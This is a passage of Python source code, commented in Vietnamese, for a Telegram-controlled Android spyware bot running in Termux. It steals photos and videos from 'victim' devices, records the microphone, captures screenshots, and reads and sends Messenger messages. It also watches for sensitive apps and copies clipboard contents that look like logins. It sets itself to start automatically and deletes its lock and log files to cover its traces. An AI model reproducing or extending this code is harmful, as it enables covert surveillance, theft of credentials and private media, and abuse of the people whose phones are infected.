                        if image_count >= max_images:
                            send_to_telegram(f"Đã gửi {max_images} ảnh. Gửi '2' để tiếp tục.")
                            # Ghi lại danh sách mới
                            with open(sent_list_file, "a") as f:
                                for item in new_sent:
                                    f.write(item + "\n")
                            function_menu_sent = False
                            return

        if image_count == 0:
            send_to_telegram("Không tìm thấy ảnh mới để gửi.")
        else:
            send_to_telegram(f"Đã gửi {image_count} ảnh.")
            with open(sent_list_file, "a") as f:
                for item in new_sent:
                    f.write(item + "\n")

    except Exception as e:
        send_to_telegram(f"Lỗi khi quét ảnh: {str(e)}")
    finally:
        function_menu_sent = False

# Tấn công Lấy Video (tính năng 3)
def steal_videos():
    global function_menu_sent
    if stop_event.is_set():
        return

    if check_device_status(selected_device.device_id) == "offline":
        send_to_telegram("Thiết bị nạn nhân hiện không hoạt động. Vui lòng yêu cầu nạn nhân bật Termux.")
        function_menu_sent = False
        return

    if not check_storage_permission():
        send_to_telegram("Lỗi: Termux không có quyền truy cập bộ nhớ. Vui lòng chạy lệnh 'termux-setup-storage' trên Termux và cấp quyền.")
        function_menu_sent = False
        return

    try:
        paths = [
            "/sdcard/DCIM/Camera/",
            "/sdcard/Movies/",
            "/sdcard/Download/"
        ]
        video_count = 0
        max_videos = 3

        for path in paths:
            if not os.path.exists(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith((".mp4", ".mov")) and video_count < max_videos:
                        video_path = os.path.join(root, file)
                        if os.path.getsize(video_path) > 50 * 1024 * 1024:
                            send_to_telegram(f"⚠️ Bỏ qua {file} (quá lớn)")
                            continue
                        send_file_to_telegram(video_path)
                        video_count += 1
                        time.sleep(5)

        if video_count > 0:
            send_to_telegram(f"✅ Đã gửi {video_count} video")
        else:
            send_to_telegram("❌ Không tìm thấy video")

    except Exception as e:
        send_to_telegram(f"Lỗi khi quét video: {str(e)}")
    finally:
        function_menu_sent = False

# Ghi âm mic (tính năng 4)
def record_audio():
    global function_menu_sent
    if stop_event.is_set():
        return
    if check_device_status(selected_device.device_id) == "offline":
        send_to_telegram("Thiết bị nạn nhân hiện không hoạt động. Vui lòng yêu cầu nạn nhân bật Termux.")
        function_menu_sent = False
        return

    if not check_mic_permission():
        send_to_telegram("Lỗi: Termux không có quyền truy cập mic. Vui lòng cấp quyền bằng lệnh 'termux-microphone-record' trên Termux và đồng ý cấp quyền.")
        function_menu_sent = False
        return

    mic_status = check_mic_status()
    if mic_status == "busy":
        send_to_telegram("Lỗi: Mic đang được ứng dụng khác sử dụng. Vui lòng đóng các ứng dụng đang dùng mic và thử lại.")
        function_menu_sent = False
        return
    elif mic_status == "error":
        send_to_telegram("Lỗi: Không thể kiểm tra trạng thái mic. Có thể mic không hoạt động hoặc Termux-API không được cài đặt đúng.")
        function_menu_sent = False
        return

    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        audio_path = os.path.join(os.path.dirname(__file__), f"audio_{timestamp}.wav")
        
        result = subprocess.run(["termux-microphone-record", "-i"], capture_output=True, text=True)
        if "Recording is active" in result.stdout:
            subprocess.run(["termux-microphone-record", "-q"])
            time.sleep(1)

        send_to_telegram("Đang ghi âm mic (5 giây)...")
        result = subprocess.run(["termux-microphone-record", "-f", audio_path, "-l", "5"], capture_output=True, text=True)
        if result.returncode != 0:
            error_msg = result.stderr if result.stderr else "Lỗi không xác định"
            send_to_telegram(f"Lỗi khi ghi âm: {error_msg}. Có thể mic không hoạt động hoặc Termux-API không được cài đặt đúng.")
            function_menu_sent = False
            return

        for _ in range(6):
            if stop_event.is_set():
                send_to_telegram("Bot đã dừng ghi âm.")
                subprocess.run(["termux-microphone-record", "-q"])
                function_menu_sent = False
                return
            time.sleep(1)

        result = subprocess.run(["termux-microphone-record", "-i"], capture_output=True, text=True)
        if "Recording is active" in result.stdout:
            subprocess.run(["termux-microphone-record", "-q"])
            time.sleep(1)

        if not os.path.exists(audio_path):
            send_to_telegram("Lỗi: File ghi âm không được tạo. Có thể Termux không có quyền truy cập mic hoặc mic không hoạt động.")
            function_menu_sent = False
            return
        if os.path.getsize(audio_path) == 0:
            send_to_telegram("Lỗi: File ghi âm rỗng. Có thể mic không hoạt động, không có âm thanh, hoặc thiết bị không hỗ trợ ghi âm.")
            os.remove(audio_path)
            function_menu_sent = False
            return

        send_to_telegram("Ghi âm hoàn tất, đang gửi file...")
        send_file_to_telegram(audio_path)
        os.remove(audio_path)
    except Exception as e:
        send_to_telegram(f"Lỗi khi ghi âm: {str(e)}")
    finally:
        function_menu_sent = False

# Truy cập Messenger để gửi tin nhắn (tính năng 5)
def access_messenger():
    global function_menu_sent
    if stop_event.is_set():
        return
    if check_device_status(selected_device.device_id) == "offline":
        send_to_telegram("Thiết bị nạn nhân hiện không hoạt động. Vui lòng yêu cầu nạn nhân bật Termux.")
        function_menu_sent = False
        return
    if not check_wifi():
        send_to_telegram("Thiết bị nạn nhân không kết nối Wi-Fi. Vui lòng bật Wi-Fi để truy cập Messenger.")
        function_menu_sent = False
        return
    get_messenger_contacts()
    if messenger_contacts:
        send_messenger_contacts()
    function_menu_sent = False

# Truy cập Messenger để đọc tin nhắn (tính năng 6)
def read_messenger():
    global function_menu_sent
    if stop_event.is_set():
        return
    if check_device_status(selected_device.device_id) == "offline":
        send_to_telegram("Thiết bị nạn nhân hiện không hoạt động. Vui lòng yêu cầu nạn nhân bật Termux.")
        function_menu_sent = False
        return
    if not check_wifi():
        send_to_telegram("Thiết bị nạn nhân không kết nối Wi-Fi. Vui lòng bật Wi-Fi để truy cập Messenger.")
        function_menu_sent = False
        return
    get_messenger_contacts()
    if messenger_contacts:
        send_messenger_contacts()
    function_menu_sent = False

# Lệnh mới /capmh - Chụp màn hình nạn nhân (đã sửa lỗi)
def capture_screen():
    global function_menu_sent
    if stop_event.is_set():
        return
    if check_device_status(selected_device.device_id) == "offline":
        send_to_telegram("Thiết bị nạn nhân hiện không hoạt động. Vui lòng yêu cầu nạn nhân bật Termux.")
        function_menu_sent = False
        return
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screen_path = os.path.join(os.path.dirname(__file__), f"screen_{timestamp}.png")
        # Sửa lỗi: Sử dụng đường dẫn đầy đủ đến screencap
        result = subprocess.run(["/system/bin/screencap", "-p", screen_path], capture_output=True, text=True)
        if result.returncode == 0 and os.path.exists(screen_path) and os.path.getsize(screen_path) > 0:
            send_file_to_telegram(screen_path)
            send_to_telegram("Chụp màn hình hoàn tất, đã gửi file.")
            os.remove(screen_path)
        else:
            error_msg = result.stderr if result.stderr else "Lỗi không xác định khi chạy screencap."
            send_to_telegram(f"Lỗi khi chụp màn hình: {error_msg}")
    except Exception as e:
        send_to_telegram(f"Lỗi khi chụp màn hình: {str(e)}")
    finally:
        function_menu_sent = False

# Tính năng mới: Tự động phát hiện app/web login và capture info
def monitor_login_apps():
    last_clipboard = ""
    while bot_active and not stop_event.is_set():
        try:
            # Lấy foreground app dùng dumpsys
            result = subprocess.run(["/system/bin/dumpsys", "activity", "activities"], capture_output=True, text=True)
            output = result.stdout
            foreground_app = ""
            for line in output.splitlines():
                if "mFocusedActivity" in line:
                    foreground_app = line.split("/")[0].split()[-1]
                    break

            if foreground_app in TARGET_APPS:
                send_to_telegram(f"🚨 Phát hiện nạn nhân mở app nhạy cảm: {foreground_app}! Đang capture login info...")

                # Chụp màn hình ngay
                capture_screen()

                # Quét clipboard (nếu copy tk/mk)
                clip_result = subprocess.run(["termux-clipboard-get"], capture_output=True, text=True)
                clipboard_content = clip_result.stdout.strip()
                if clipboard_content and clipboard_content != last_clipboard:
                    last_clipboard = clipboard_content
                    # Kiểm tra nếu giống tk/mk (đơn giản: chứa @ hoặc : hoặc pass)
                    if "@" in clipboard_content or ":" in clipboard_content or "pass" in clipboard_content.lower():
                        send_to_telegram(f"🔑 Phát hiện tiềm năng tk/mk trong clipboard: {clipboard_content}")
                    else:
                        send_to_telegram(f"📋 Clipboard content: {clipboard_content}")

            time.sleep(10)  # Check mỗi 10 giây để tránh nặng CPU
        except Exception as e:
            send_to_telegram(f"Lỗi monitor app: {str(e)}")
            time.sleep(30)

# Xử lý lệnh từ Telegram
def handle_commands():
    global last_update_id, running, device_selection_mode, selected_device, bot_active, device_menu_sent, function_menu_sent, messenger_mode, selected_contact, messenger_contacts
    commands = {
        "1": get_device_info_command,
        "2": steal_files,
        "3": steal_videos,
        "4": record_audio,
        "5": access_messenger,
        "6": read_messenger,
        "/CAPMH": capture_screen
    }
    retry_count = 0
    max_retries = 10

    while True:
        try:
            if stop_event.is_set():
                retry_count = 0
                time.sleep(5)
                response = requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates?offset={last_update_id}", timeout=10)
                if response.ok:
                    updates = response.json()
                    if updates.get("result"):
                        for update in updates["result"]:
                            last_update_id = update["update_id"] + 1
                            if "message" in update and "text" in update["message"] and str(update["message"]["chat"]["id"]) == CHAT_ID:
                                command = update["message"]["text"].strip().upper()
                                if command == "Y":
                                    stop_event.clear()
                                    running = True
                                    device_selection_mode = True
                                    selected_device = None
                                    device_menu_sent = False
                                    function_menu_sent = False
                                    messenger_mode = False
                                    send_to_telegram("Bot đã được bật lại!")
                                    send_device_menu()
                                    break
                continue

            response = requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates",params={"offset": last_update_id + 1, "timeout": 30}, timeout=60)
            if not response.ok:
                retry_count += 1
                send_to_telegram(f"Lỗi khi lấy lệnh từ Telegram: {response.text}")
                if retry_count >= max_retries:
                    send_to_telegram("Không thể kết nối Telegram sau nhiều lần thử. Bot tạm dừng xử lý lệnh. Kiểm tra mạng hoặc token! Gửi 'Y' để thử lại.")
                    time.sleep(30)
                    retry_count = 0
                time.sleep(5)
                continue

            updates = response.json()
            retry_count = 0

            if updates.get("result"):
                for update in updates["result"]:
                    last_update_id = update["update_id"] + 1
                    if "message" in update and "text" in update["message"] and str(update["message"]["chat"]["id"]) == CHAT_ID:
                        command = update["message"]["text"].strip()

                        if device_selection_mode:
                            if not device_menu_sent:
                                send_device_menu()
                            try:
                                device_id = int(command)
                                selected_device = next((device for device in infected_devices if device.device_id == device_id), None)
                                if selected_device:
                                    device_selection_mode = False
                                    device_menu_sent = False
                                    function_menu_sent = False
                                    messenger_mode = False
                                    send_menu()
                                else:
                                    send_to_telegram(f"Không tìm thấy thiết bị {device_id}. Chọn lại.")
                                    device_menu_sent = False
                                    send_device_menu()
                            except ValueError:
                                send_to_telegram("Vui lòng nhập số (1, 2, 3,...) để chọn thiết bị.")
                                device_menu_sent = False
                                send_device_menu()
                        else:
                            if messenger_mode:
                                if command.upper() == "BACK":
                                    messenger_mode = False
                                    selected_contact = None
                                    function_menu_sent = False
                                    send_menu()
                                    continue
                                try:
                                    contact_idx = int(command) - 1
                                    if 0 <= contact_idx < len(messenger_contacts):
                                        selected_contact = messenger_contacts[contact_idx]
                                        if "5" in commands:  # Gửi tin nhắn
                                            send_to_telegram(f"Đã chọn liên lạc: {selected_contact['name']}. Bạn muốn nhắn gì qua Messenger? Reply nội dung tin nhắn.")
                                        elif "6" in commands:  # Đọc tin nhắn
                                            read_messenger_messages(selected_contact["name"])
                                            messenger_mode = False
                                            selected_contact = None
                                            function_menu_sent = False
                                            send_menu()
                                    else:
                                        send_to_telegram("Số không hợp lệ. Vui lòng chọn lại liên lạc.")
                                        send_messenger_contacts()
                                except ValueError:
                                    if selected_contact:
                                        message = command
                                        send_messenger_message(selected_contact["name"], message)
                                        messenger_mode = False
                                        selected_contact = None
                                        function_menu_sent = False
                                        send_menu()
                                    else:
                                        send_to_telegram("Vui lòng nhập số (1, 2, 3,...) để chọn liên lạc.")
                                        send_messenger_contacts()
                            else:
                                if not function_menu_sent:
                                    send_menu()
                                command = command.upper()
                                if command == "D":
                                    running = False
                                    stop_event.set()
                                    send_to_telegram("Bot đã tạm dừng! Gửi 'Y' để bật lại.")
                                    device_menu_sent = False
                                    function_menu_sent = False
                                    messenger_mode = False
                                elif command == "Y":
                                    if stop_event.is_set():
                                        stop_event.clear()
                                        running = True
                                        device_selection_mode = True
                                        selected_device = None
                                        device_menu_sent = False
                                        function_menu_sent = False
                                        messenger_mode = False
                                        send_to_telegram("Bot đã được bật lại!")
                                        send_device_menu()
                                elif command == "BACK":
                                    device_selection_mode = True
                                    selected_device = None
                                    device_menu_sent = False
                                    function_menu_sent = False
                                    messenger_mode = False
                                    send_device_menu()
                                elif command in commands and running:
                                    function_menu_sent = False
                                    commands[command]()
                                    send_menu()
                                else:
                                    send_to_telegram("Lệnh không hợp lệ. Chọn số (1-6), 'D' để dừng, 'Y' để bật lại, 'BACK' để chọn thiết bị, hoặc /capmh để chụp màn hình.")
                                    function_menu_sent = False
                                    send_menu()
            time.sleep(5)
        except Exception as e:
            retry_count += 1
            send_to_telegram(f"Lỗi kết nối Telegram: {str(e)}")
            if retry_count >= max_retries:
                send_to_telegram("Không thể kết nối Telegram sau nhiều lần thử. Bot tạm dừng xử lý lệnh. Kiểm tra mạng hoặc token! Gửi 'Y' để thử lại.")
                time.sleep(30)
                retry_count = 0
            time.sleep(5)

# Giữ Termux ở foreground bằng thông báo
def keep_alive():
    while bot_active:
        if selected_device:
            save_device_status(selected_device.device_id, "online")
        subprocess.run(["termux-toast", "-g", "middle", "Bonet Bot đang chạy..."], capture_output=True, text=True)
        time.sleep(10)
        
def clean_trace():
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    subprocess.run(["termux-wake-unlock"], stderr=subprocess.DEVNULL)

def cleanup():
    try:
        release_lock()
    except Exception as e:
        print(f"Lỗi release_lock: {e}")
    try:
        clean_trace()
    except Exception as e:
        print(f"Lỗi clean_trace: {e}")

if __name__ == "__main__":
    atexit.register(cleanup)
    lock_fd = acquire_lock()
    stop_duplicate_instances()
    load_infected_devices()

    if not check_network():
        try:
            ensure_log_file()
            with open(LOG_FILE, "a") as f:
                f.write(f"[{datetime.now()}] Lỗi: Không có kết nối mạng khi khởi động bot.\n")
        except Exception as e:
            print(f"Không thể ghi log: {str(e)}")
        sys.exit(1)

    if not send_to_telegram("Bot đang khởi động..."):
        print("Không thể gửi thông báo khởi động qua Telegram, nhưng bot vẫn chạy.")

    report_infection()
    setup_autorun()

    if infected_devices:
        for device in infected_devices:
            save_device_status(device.device_id, "online")
        send_device_menu()

    # Khởi động thread monitor login mới
    monitor_thread = threading.Thread(target=monitor_login_apps, daemon=True)
    monitor_thread.start()

    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()

    command_thread = threading.Thread(target=handle_commands, daemon=True)
    command_thread.start()

    while bot_active:
        time.sleep(5)